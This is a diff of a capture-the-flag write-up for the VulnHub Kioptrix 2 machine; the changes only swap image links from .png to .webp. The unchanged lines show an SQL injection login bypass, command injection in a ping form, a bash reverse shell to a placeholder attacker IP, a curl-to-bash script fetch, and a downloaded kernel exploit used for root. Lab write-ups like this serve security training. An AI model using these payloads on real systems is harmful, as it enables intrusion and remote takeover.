@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "https://cdn.ziomsec.com/kioptrix2/cover.png"
+  image: "https://cdn.ziomsec.com/kioptrix2/cover.webp"
   caption: "Kioptrix 2 VulnHub Challenge"
   alt: "Kioptrix 2 cover"
 platform: "VulnHub"
@@ -43,9 +43,9 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 | 658      | cups        |
 | 3306     | mysql       |
 
-![](https://cdn.ziomsec.com/kioptrix2/1.png)
-![](https://cdn.ziomsec.com/kioptrix2/2.png)
-![](https://cdn.ziomsec.com/kioptrix2/3.png)
+![](https://cdn.ziomsec.com/kioptrix2/1.webp)
+![](https://cdn.ziomsec.com/kioptrix2/2.webp)
+![](https://cdn.ziomsec.com/kioptrix2/3.webp)
 
 > The _unauthorized_ label next to the SQL server indicated that remote login was disabled and hence the server could only be accessed locally.
 
@@ -53,7 +53,7 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 
 Since port 80 was open, I visited the web application on my browser and found a login page.
 
-![](https://cdn.ziomsec.com/kioptrix2/4.png)
+![](https://cdn.ziomsec.com/kioptrix2/4.webp)
 
 After trying a few default credentials, I tried performing an SQL injection using some simple payloads. When I entered the below payload in the *username* field, I was able to bypass the entire authentication mechanism.
 
@@ -61,13 +61,13 @@ After trying a few default credentials, I tried performing an SQL injection usin
 admin' or 1=1#
 ```
 
-![](https://cdn.ziomsec.com/kioptrix2/5.png)
+![](https://cdn.ziomsec.com/kioptrix2/5.webp)
 
 After logging in, I got access to a page that allowed me **ping** a machine. I entered the IP of my router and got the ping results in another page.
 
-![](https://cdn.ziomsec.com/kioptrix2/6.png)
+![](https://cdn.ziomsec.com/kioptrix2/6.webp)
 
-![](https://cdn.ziomsec.com/kioptrix2/7.png)
+![](https://cdn.ziomsec.com/kioptrix2/7.webp)
 
 The application displayed raw output of the **ping** command. This made me wonder if it was actually executing a system command on the provided input. If it were doing so, I could add another system command and try making it execute that as well.
 
@@ -76,12 +76,12 @@ The application displayed raw output of the **ping** command. This made me wonde
 ```
 > `;` is used to execute multiple commands in a single line on linux systems. There are many other ways of executing multiple together.
 
-![](https://cdn.ziomsec.com/kioptrix2/8.png)
+![](https://cdn.ziomsec.com/kioptrix2/8.webp)
 
 The command that I injected got executed and I was able to view the contents present in the directory being used by the application. Hence I used a **bash** reverse shell payload from **revshells** to get a reverse shell from the target on my listener.
  - https://www.revshells.com/
 
-![](https://cdn.ziomsec.com/kioptrix2/9.png)
+![](https://cdn.ziomsec.com/kioptrix2/9.webp)
 
 I then started a netcat listener on my PC using **nc**.
 
@@ -95,7 +95,7 @@ Finally I executed the payload and got reverse shell
 8.8.8.8; bash -i >& /dev/tcp/KALI_IP/PORT 0>&1
 ```
 
-![](https://cdn.ziomsec.com/kioptrix2/10.png)
+![](https://cdn.ziomsec.com/kioptrix2/10.webp)
 
 I got a shell as a service user.
 
@@ -105,7 +105,7 @@ I got a shell as a service user.
 
 While exploring, I discovered two users, _john_ and _harold_. However, I couldn't access their directories.
 
-![](https://cdn.ziomsec.com/kioptrix2/11.png)
+![](https://cdn.ziomsec.com/kioptrix2/11.webp)
 
 To ease up enumeration, I downloaded the **linux Smart Enumeration** script on the target system and ran it.
 
@@ -117,13 +117,13 @@ python3 -m http.server 8080
 curl http://KALI:8080/lse.sh | /bin/bash
 ```
 
-![](https://cdn.ziomsec.com/kioptrix2/12.png)
+![](https://cdn.ziomsec.com/kioptrix2/12.webp)
 
-![](https://cdn.ziomsec.com/kioptrix2/13.png)
+![](https://cdn.ziomsec.com/kioptrix2/13.webp)
 
 I found the following SUID binaries, but unfortunately, they didn't seem exploitable.
 
-![](https://cdn.ziomsec.com/kioptrix2/14.png)
+![](https://cdn.ziomsec.com/kioptrix2/14.webp)
 
 I double-checked my kernel version:
 
@@ -131,7 +131,7 @@ I double-checked my kernel version:
 uname -a
 ```
 
-![](https://cdn.ziomsec.com/kioptrix2/15.png)
+![](https://cdn.ziomsec.com/kioptrix2/15.webp)
 
 The **lse** script also revealed that the target was running **CentOS**, so I searched for exploits related to it on **Exploit DB**.
 
@@ -139,7 +139,7 @@ The **lse** script also revealed that the target was running **CentOS**, so I se
 searchsploit 'Centos 2.6.9'
 ```
 
-![](https://cdn.ziomsec.com/kioptrix2/16.png)
+![](https://cdn.ziomsec.com/kioptrix2/16.webp)
 
 ### Exploiting Kernel
 
@@ -155,9 +155,9 @@ wget http://KALI:8080/9542.c
 ```
 
 
-![](https://cdn.ziomsec.com/kioptrix2/17.png)
+![](https://cdn.ziomsec.com/kioptrix2/17.webp)
 
-![](https://cdn.ziomsec.com/kioptrix2/18.png)
+![](https://cdn.ziomsec.com/kioptrix2/18.webp)
 
 After downloading it, I compiled it using **gcc** and ran it to get a shell as **root**.
 
@@ -166,7 +166,7 @@ gcc 9542.c
 ./a.out
 ```
 
-![](https://cdn.ziomsec.com/kioptrix2/19.png)
+![](https://cdn.ziomsec.com/kioptrix2/19.webp)
 
 ## Closure
 
